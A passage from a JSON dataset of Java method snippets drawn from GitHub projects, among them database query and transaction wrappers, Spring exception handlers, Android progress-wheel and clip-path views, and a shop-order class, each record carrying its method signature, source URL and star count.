ex){\n            ex.printStackTrace();\n            return null;\n        }\n        for(Field f : mainClazz.getDeclaredFields()){\n            if(f.getAnnotation(Serializable.class) == null) continue;\n            try{\n                f.setAccessible(true);\n                f.set(obj, unwrap(objectTag.getTag(f.getName())));\n                f.setAccessible(false);\n            }catch(IllegalAccessException ex){\n                ex.printStackTrace();\n            }\n        }\n        return (T) obj;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30855, "method_name": "query", "class_name": "DatabaseOperator", "params": ["String", "ResultSetHandler<T>", "Object"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T query(final String baseQuery, final ResultSetHandler<T> resultHandler,\n      final Object... params)\n      throws SQLException {\n    try {\n      return this.queryRunner.query(baseQuery, resultHandler, params);\n    } catch (final SQLException ex) {\n      // todo kunkun-tang: Retry logics should be implemented here.\n      logger.error(\"query failed\", ex);\n      if (this.dbMetrics != null) {\n        this.dbMetrics.markDBFailQuery();\n      }\n      throw ex;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30856, "method_name": "query", "class_name": "DatabaseOperator", "params": ["String", "ResultSetHandler<T>"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T query(final String baseQuery, final ResultSetHandler<T> resultHandler)\n          throws SQLException {\n    try {\n      return this.queryRunner.query(baseQuery, resultHandler);\n    } catch (final SQLException ex) {\n      // todo kunkun-tang: Retry logics should be implemented here.\n      logger.error(\"query failed\", ex);\n      if (this.dbMetrics != null) {\n        this.dbMetrics.markDBFailQuery();\n      }\n      throw ex;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30857, "method_name": "transaction", "class_name": "DatabaseOperator", "params": ["SQLTransaction<T>"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T transaction(final SQLTransaction<T> operations) throws SQLException {\n    Connection conn = null;\n    try {\n      conn = this.queryRunner.getDataSource().getConnection();\n      conn.setAutoCommit(false);\n      final DatabaseTransOperator transOperator = new DatabaseTransOperator(this.queryRunner,\n          conn);\n      final T res = operations.execute(transOperator);\n      conn.commit();\n      return res;\n    } catch (final SQLException ex) {\n      // todo kunkun-tang: Retry logics should be implemented here.\n      logger.error(\"transaction failed\", ex);\n      if (this.dbMetrics != null) {\n        this.dbMetrics.markDBFailTransaction();\n      }\n      throw ex;\n    } finally {\n      DbUtils.closeQuietly(conn);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30858, "method_name": "update", "class_name": "DatabaseOperator", "params": ["String", "Object"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int update(final String updateClause, final Object... params) throws SQLException {\n    try {\n      return this.queryRunner.update(updateClause, params);\n    } catch (final SQLException ex) {\n      // todo kunkun-tang: Retry logics should be implemented here.\n      logger.error(\"update failed\", ex);\n      if (this.dbMetrics != null) {\n        this.dbMetrics.markDBFailUpdate();\n      }\n      throw ex;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30859, "method_name": "getDataSource", "class_name": "DatabaseOperator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "AzkabanDataSource", "snippet": "  public AzkabanDataSource getDataSource() {\n    return (AzkabanDataSource) this.queryRunner.getDataSource();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-db/src/main/java/azkaban/db/DatabaseOperator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30860, "method_name": "errorParameterHandler", "class_name": "ExceptionResolverContext", "params": ["ConstraintViolationException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorParameterHandler(ConstraintViolationException e) {\n        StringBuilder message = new StringBuilder();\n        for (ConstraintViolation<?> c : e.getConstraintViolations()) {\n            message.append(c.getMessage());\n        }\n        Response<Object> response = new Response<>();\n        response.setCode(CodeConstant.PARAMETER_ERROR);\n        response.setMessage(message.toString());\n        return response;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30861, "method_name": "errorParameterHandler", "class_name": "ExceptionResolverContext", "params": ["MethodArgumentNotValidException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorParameterHandler(MethodArgumentNotValidException e){\n        String message = e.getBindingResult().getFieldErrors().get(0).getDefaultMessage();\n        return new Response<>().errorResponse(CodeConstant.PARAMETER_ERROR, null , message);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30862, "method_name": "errorParameterHandler", "class_name": "ExceptionResolverContext", "params": ["BindingException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorParameterHandler(BindingException e){\n        String message = e.getMessage();\n        return new Response<>().errorResponse(CodeConstant.PARAMETER_ERROR, null , message);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30863, "method_name": "errorParameterHandler", "class_name": "ExceptionResolverContext", "params": ["BindException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorParameterHandler(BindException e){\n        String message = e.getAllErrors().get(0).getDefaultMessage();\n        return new Response<>().errorResponse(CodeConstant.PARAMETER_ERROR, null , message);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30864, "method_name": "endPointErrorHandler", "class_name": "ExceptionResolverContext", "params": ["EndPointException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> endPointErrorHandler(EndPointException e){\n        String uiMessage = e.getUiMessage();\n        String message = this.informationSwitch(uiMessage);\n        if(e.getArgs() != null && e.getArgs().length > 0){\n            message = PatternInjectUtils.inject(message,e.getArgs());\n        }\n        return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null, message);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30865, "method_name": "errorHandler", "class_name": "ExceptionResolverContext", "params": ["Exception"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorHandler(Exception e) {\n        LOG.error(\"SYSTEM_EXCEPTION, message: {}\", e.getMessage(), e);\n        return new Response<>().errorResponse(CodeConstant.SYS_ERROR, null,\n                \"\u7cfb\u7edf\u5904\u7406\u5f02\u5e38(System Exception)[\" + e.getMessage() + \"]\");\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30866, "method_name": "informationSwitch", "class_name": "ExceptionResolverContext", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String informationSwitch(String str){\n        Locale locale = LocaleContextHolder.getLocale();\n        try{\n            return messageSource.getMessage(str,null,locale);\n        }catch(NoSuchMessageException e){\n            return \"\u672a\u5b9a\u4e49\u5f02\u5e38(Undefined Exception)[\" + str + \"]\";\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/controller/ExceptionResolverContext.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30867, "method_name": "draw", "class_name": "SettingsPanel", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void draw(int mouseX, int mouseY, float partialTicks) {\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/SettingsPanel.java", "stars": "12", "class_props": {"extends": "Panel", "implements": null, "modifiers": ["public"]}}, {"id": 30868, "method_name": "onDraw", "class_name": "Practice02ClipPathView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        canvas.save();\n        canvas.clipPath(path1);\n        canvas.drawBitmap(bitmap, point1.x, point1.y, paint);\n        canvas.restore();\n\n        canvas.save();\n        canvas.clipPath(path2);\n        canvas.drawBitmap(bitmap, point2.x, point2.y, paint);\n        canvas.restore();\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson4/Practice02ClipPathView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 30869, "method_name": "getNumero", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getNumero() {\n        return numero;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30870, "method_name": "setNumero", "class_name": "Encomenda", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNumero(int numero) {\n        this.numero = numero;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30871, "method_name": "getProdutos", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Produto>", "snippet": "    public ArrayList<Produto> getProdutos() {\n        return Produtos;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30872, "method_name": "setProdutos", "class_name": "Encomenda", "params": ["ArrayList<Produto>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProdutos(ArrayList<Produto> Produtos) {\n        this.Produtos = Produtos;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30873, "method_name": "getData", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getData(){\n        return this.data;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30874, "method_name": "setData", "class_name": "Encomenda", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setData(Date d){\n        this.data=d;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30875, "method_name": "getCodigo_Cliente", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "   public int getCodigo_Cliente(){\n       return this.codigo_cliente;\n   }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30876, "method_name": "setCodigo_Cliente", "class_name": "Encomenda", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "   public void setCodigo_Cliente(int cc){\n       this.codigo_cliente=cc;\n   }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30877, "method_name": "totalEncomenda", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double totalEncomenda(){\n        double t=0;\n           for(Produto p: this.Produtos) t=t+p.getPreco();\n        return t;\n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30878, "method_name": "verEncomenda", "class_name": "Encomenda", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void verEncomenda(){\n        System.out.println(\" Encomenda N\u00ba \"+this.numero+\" Cliente N\u00ba\"+this.codigo_cliente+\" Data \"+this.data);\n        System.out.println(\"Esta encomenda tem \"+this.Produtos.size()+\" produtos\");\n        System.out.println(\"========================== Listas de Produtos ===============================\");\n           for(Produto p: this.Produtos) p.imprimir();\n        System.out.println(\"=====================================\");\n        \n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30879, "method_name": "adicionarProduto", "class_name": "Encomenda", "params": ["Produto"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void adicionarProduto(Produto p){\n        Produtos.add(p);  \n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30880, "method_name": "removerProdutoEncomenda", "class_name": "Encomenda", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removerProdutoEncomenda( int cod){\n        \n        for(int i=0;i<Produtos.size();i++){\n            Produto p =Produtos.get(i);\n            if(p.getCodigo()==cod){\n                Produtos.remove(p); break;\n            }\n        }\n        \n    }", "url": "https://raw.githubusercontent.com/Denilson-Semedo/ExeLoja/master/src/exloja/Encomenda.java", "stars": "1", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 30881, "method_name": "onMeasure", "class_name": "ProgressView", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n        int width;\n        int height;\n\n        int viewWidth = mCircleRadius + this.getPaddingLeft() + this.getPaddingRight();\n        int viewHeight = mCircleRadius + this.getPaddingTop() + this.getPaddingBottom();\n\n        int widthMode = MeasureSpec.getMode(widthMeasureSpec);\n        int widthSize = MeasureSpec.getSize(widthMeasureSpec);\n\n        int heightMode = MeasureSpec.getMode(heightMeasureSpec);\n        int heightSize = MeasureSpec.getSize(heightMeasureSpec);\n\n        switch (widthMode) {\n            case MeasureSpec.EXACTLY:\n                width = widthSize;\n                break;\n            case MeasureSpec.AT_MOST:\n            case MeasureSpec.UNSPECIFIED:\n                width = Math.min(viewWidth, widthSize);\n                break;\n            default:\n                width = viewWidth;\n                break;\n        }\n\n        if (heightMode == MeasureSpec.EXACTLY || widthMode == MeasureSpec.EXACTLY) {\n            height = heightSize;\n        } else if (heightMode == MeasureSpec.AT_MOST) {\n            height = Math.min(viewHeight, heightSize);\n        } else {\n            height = viewHeight;\n        }\n\n        setMeasuredDimension(width, height);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30882, "method_name": "onSizeChanged", "class_name": "ProgressView", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n        super.onSizeChanged(w, h, oldw, oldh);\n\n        setupBounds(w, h);\n        setupPaints();\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30883, "method_name": "setupPaints", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setupPaints() {\n        mBarPaint.setColor(mBarColor);\n        mBarPaint.setAntiAlias(true);\n        mBarPaint.setStyle(Style.STROKE);\n        mBarPaint.setStrokeWidth(mBarWidth);\n\n        mRimPaint.setColor(mRimColor);\n        mRimPaint.setAntiAlias(true);\n        mRimPaint.setStyle(Style.STROKE);\n        mRimPaint.setStrokeWidth(mRimWidth);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30884, "method_name": "setupBounds", "class_name": "ProgressView", "params": ["int", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setupBounds(int layoutWidth, int layoutHeight) {\n        int paddingTop = getPaddingTop();\n        int paddingBottom = getPaddingBottom();\n        int paddingLeft = getPaddingLeft();\n        int paddingRight = getPaddingRight();\n\n        if (!mFillRadius) {\n            // Width should equal to Height, find the min value to setup the circle\n            int minValue = Math.min(layoutWidth - paddingLeft - paddingRight,\n                    layoutHeight - paddingBottom - paddingTop);\n\n            int circleDiameter = Math.min(minValue, mCircleRadius * 2 - mBarWidth * 2);\n\n            // Calc the Offset if needed for centering the wheel in the available space\n            int xOffset = (layoutWidth - paddingLeft - paddingRight - circleDiameter) / 2 + paddingLeft;\n            int yOffset = (layoutHeight - paddingTop - paddingBottom - circleDiameter) / 2 + paddingTop;\n\n            mCircleBounds = new RectF(xOffset + mBarWidth, yOffset + mBarWidth, xOffset + circleDiameter - mBarWidth,\n                            yOffset + circleDiameter - mBarWidth);\n        } else {\n            mCircleBounds = new RectF(paddingLeft + mBarWidth, paddingTop + mBarWidth,\n                    layoutWidth - paddingRight - mBarWidth, layoutHeight - paddingBottom - mBarWidth);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30885, "method_name": "setCallback", "class_name": "ProgressView", "params": ["ProgressCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCallback(ProgressCallback progressCallback) {\n        mCallback = progressCallback;\n\n        if (!isSpinning) {\n            runCallback();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30886, "method_name": "onDraw", "class_name": "ProgressView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        canvas.drawArc(mCircleBounds, 360, 360, false, mRimPaint);\n\n        boolean mustInvalidate = false;\n\n        if (!mShouldAnimate) {\n            return;\n        }\n\n        if (isSpinning) {\n            //Draw the spinning bar\n            mustInvalidate = true;\n\n            long deltaTime = (SystemClock.uptimeMillis() - mLastTimeAnimated);\n            float deltaNormalized = deltaTime * mSpinSpeed / 1000.0f;\n\n            updateBarLength(deltaTime);\n\n            mProgress += deltaNormalized;\n            if (mProgress > 360) {\n                mProgress -= 360f;\n\n                // A full turn has been completed\n                // we run the callback with -1 in case we want to\n                // do something, like changing the color\n                runCallback(-1.0f);\n            }\n            mLastTimeAnimated = SystemClock.uptimeMillis();\n\n            float from = mProgress - 90;\n            float length = BAR_LENGTH + mBarExtraLength;\n\n            if (isInEditMode()) {\n                from = 0;\n                length = 135;\n            }\n\n            canvas.drawArc(mCircleBounds, from, length, false, mBarPaint);\n        } else {\n            float oldProgress = mProgress;\n\n            if (mProgress != mTargetProgress) {\n                //We smoothly increase the progress bar\n                mustInvalidate = true;\n\n                float deltaTime = (float) (SystemClock.uptimeMillis() - mLastTimeAnimated) / 1000;\n                float deltaNormalized = deltaTime * mSpinSpeed;\n\n                mProgress = Math.min(mProgress + deltaNormalized, mTargetProgress);\n                mLastTimeAnimated = SystemClock.uptimeMillis();\n            }\n\n            if (oldProgress != mProgress) {\n                runCallback();\n            }\n\n            float offset = 0.0f;\n            float progress = mProgress;\n            if (!mLinearProgress) {\n                float factor = 2.0f;\n                offset = (float) (1.0f - Math.pow(1.0f - mProgress / 360.0f, 2.0f * factor)) * 360.0f;\n                progress = (float) (1.0f - Math.pow(1.0f - mProgress / 360.0f, factor)) * 360.0f;\n            }\n\n            if (isInEditMode()) {\n                progress = 360;\n            }\n\n            canvas.drawArc(mCircleBounds, offset - 90, progress, false, mBarPaint);\n        }\n\n        if (mustInvalidate) {\n            invalidate();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30887, "method_name": "onVisibilityChanged", "class_name": "ProgressView", "params": ["View", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onVisibilityChanged(@NonNull View changedView, int visibility) {\n        super.onVisibilityChanged(changedView, visibility);\n\n        if (visibility == VISIBLE) {\n            mLastTimeAnimated = SystemClock.uptimeMillis();\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30888, "method_name": "updateBarLength", "class_name": "ProgressView", "params": ["long"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void updateBarLength(long deltaTimeInMilliSeconds) {\n        if (mPausedTimeWithoutGrowing >= PAUSE_GROWING_TIME) {\n            mTimeStartGrowing += deltaTimeInMilliSeconds;\n\n            if (mTimeStartGrowing > mBarSpinCycleTime) {\n                // We completed a size change cycle\n                // (growing or shrinking)\n                mTimeStartGrowing -= mBarSpinCycleTime;\n                //if(mBarGrowingFromFront) {\n                mPausedTimeWithoutGrowing = 0;\n                //}\n                mBarGrowingFromFront = !mBarGrowingFromFront;\n            }\n\n            float distance =\n                    (float) Math.cos((mTimeStartGrowing / mBarSpinCycleTime + 1) * Math.PI) / 2 + 0.5f;\n            float destLength = (BAR_MAX_LENGTH - BAR_LENGTH);\n\n            if (mBarGrowingFromFront) {\n                mBarExtraLength = distance * destLength;\n            } else {\n                float newLength = destLength * (1 - distance);\n                mProgress += (mBarExtraLength - newLength);\n                mBarExtraLength = newLength;\n            }\n        } else {\n            mPausedTimeWithoutGrowing += deltaTimeInMilliSeconds;\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30889, "method_name": "isSpinning", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isSpinning() {\n        return isSpinning;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30890, "method_name": "resetCount", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void resetCount() {\n        mProgress = 0.0f;\n        mTargetProgress = 0.0f;\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30891, "method_name": "stopSpinning", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stopSpinning() {\n        isSpinning = false;\n        mProgress = 0.0f;\n        mTargetProgress = 0.0f;\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30892, "method_name": "spin", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void spin() {\n        mLastTimeAnimated = SystemClock.uptimeMillis();\n        isSpinning = true;\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30893, "method_name": "runCallback", "class_name": "ProgressView", "params": ["float"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void runCallback(float value) {\n        if (mCallback != null) {\n            mCallback.onProgressUpdate(value);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30894, "method_name": "runCallback", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void runCallback() {\n        if (mCallback != null) {\n            float normalizedProgress = (float) Math.round(mProgress * 100 / 360.0f) / 100;\n            mCallback.onProgressUpdate(normalizedProgress);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30895, "method_name": "setInstantProgress", "class_name": "ProgressView", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setInstantProgress(float progress) {\n        if (isSpinning) {\n            mProgress = 0.0f;\n            isSpinning = false;\n        }\n\n        if (progress > 1.0f) {\n            progress -= 1.0f;\n        } else if (progress < 0) {\n            progress = 0;\n        }\n\n        if (progress == mTargetProgress) {\n            return;\n        }\n\n        mTargetProgress = Math.min(progress * 360.0f, 360.0f);\n        mProgress = mTargetProgress;\n        mLastTimeAnimated = SystemClock.uptimeMillis();\n        invalidate();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30896, "method_name": "onSaveInstanceState", "class_name": "ProgressView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Parcelable", "snippet": "    public Parcelable onSaveInstanceState() {\n        WheelSavedState savedState = new WheelSavedState(super.onSaveInstanceState());\n        // We save everything that can be changed at runtime\n        savedState.mProgress = this.mProgress;\n        savedState.mTargetProgress = this.mTargetProgress;\n        savedState.isSpinning = this.isSpinning;\n        savedState.spinSpeed = this.mSpinSpeed;\n        savedState.barWidth = this.mBarWidth;\n        savedState.barColor = this.mBarColor;\n        savedState.rimWidth = this.mRimWidth;\n        savedState.rimColor = this.mRimColor;\n        savedState.circleRadius = this.mCircleRadius;\n        savedState.linearProgress = this.mLinearProgress;\n        savedState.fillRadius = this.mFillRadius;\n        return savedState;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/widget/ProgressView.java", "stars": "1", "class_props": {"extends": "View", "implements": null, "modifiers": ["final", "public"]}}, {"id": 30897, "method_name": "onRestoreInstanceState", "class_name": "ProgressView", "params": ["Parcelable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onRestoreInstanceState(Parcelable state) {\n        if (!(state instanceof WheelSavedState)) {\n            super.onRestoreInstanceState(state);\n            return;\n        }\n\n        WheelSavedState savedState = (WheelSavedState) state;\n        super.onRestoreInstanceState(savedState.getSuperState());\n\n        this.mProgress = savedState.mProgress;\n        this.mTargetProgress = savedState.mTargetProgress;\n        this.isSpinning = savedState.isSpinning;\n        this.mSpinSpeed = savedState.spinSpeed;\n        this.mBarWidth = savedState.barWidth;\n        this.mBarColor = savedState.barColor;\n        this.mRimWidth = savedState.rimWidth;\n        this.mRimColor = savedState.rimColor;\n        